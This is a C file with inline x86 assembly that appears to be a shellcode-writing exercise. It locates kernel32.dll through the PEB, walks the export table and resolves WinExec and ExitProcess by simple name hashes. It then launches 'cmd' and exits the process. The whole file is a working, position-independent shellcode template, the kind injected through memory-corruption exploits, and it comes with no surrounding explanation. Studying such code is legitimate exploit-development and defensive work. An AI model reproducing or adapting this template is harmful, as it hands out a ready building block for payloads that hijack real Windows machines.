#include "stdafx.h"

void main()
{
	__asm{	
		jmp start

get_func_addr:
		// get name table index
 loop_ent:
		inc edx  // index++
		lodsd    // eax = *esi , esi += 4
		pushad
		add	ebx, eax  
		mov	esi, ebx  
		xor eax, eax  
		xor edi, edi  
 hash:
		lodsb    // eax = *esi, esi += 1   
		add edi, eax  // edi += char
		test al, al
		jnz hash   
		mov [ebp+0x10], edi 
		popad
		cmp [ebp+0x10], edi // cmp export name hash, function hash
		jne loop_ent		
		// get WinExec address
		movzx edx, word ptr [ecx+edx*2-2]	// Ordinal
		mov edi, [ebp+0x18]
		mov esi, [edi+0x1c]  	// Export Address Table
		mov edi, ebx
		add esi, edi		// Address Table
		add edi, [esi+edx*4]
		mov eax, edi
		// edi = 함수주소 리턴
		ret

start:
		// cmd
		xor eax, eax	
		mov [ebp+0xc], eax  
		mov [ebp+0xc], 0x63 // c
		mov [ebp+0xd], 0x6d // m
		mov [ebp+0xe], 0x64 // d

		// kernel32.dll base address
		mov eax, fs:[eax+0x30]   // PEB
		mov eax, [eax+0xc]   // PEB_LDR_DATA
		mov eax, [eax+0x14]  // .exe InMemoryOrderModuleList
		mov ebx, [eax]       // ntdll.dll InMemoryOrderLinks
		mov ebx, [ebx]       // kernel32.dll InMemoryOrderLinks 
		mov ebx, [ebx+0x10]	 // ebx = kernel32.dll base address

		// export table
		mov edi, [ebx+0x3c]  // PE Header
		add edi, ebx
		mov edi, [edi+0x78]	 
		add edi, ebx
		mov [ebp+0x18], edi  // Export Directory
		mov esi, [edi+0x20]  // Export Name Table
		add esi, ebx
		mov ecx, [edi+0x24]	  
		add ecx, ebx         // Ordinal Table
		xor edx, edx
		pushad

		// get WinExec addr
		xor edi, edi
		mov di, 0x2b3
		call get_func_addr
		mov	[ebp+0x20], eax
		popad

		// get ExitProcess addr
		xor edi, edi
		add di, 0x479
		call get_func_addr
		mov	[ebp+0x24], eax

		// call WinExec
		xor eax, eax  // eax = 0
		push eax
		lea	eax, [ebp+0xc]  // cmd
		push eax
		call [ebp+0x20] // WinExec('cmd',0)

		xor eax,eax
		push eax
		call [ebp+0x24] // ExitProcess(0)
	}
}